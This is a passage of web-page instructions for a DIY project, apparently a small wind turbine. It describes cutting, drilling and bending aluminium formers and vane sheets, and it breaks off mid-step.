  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
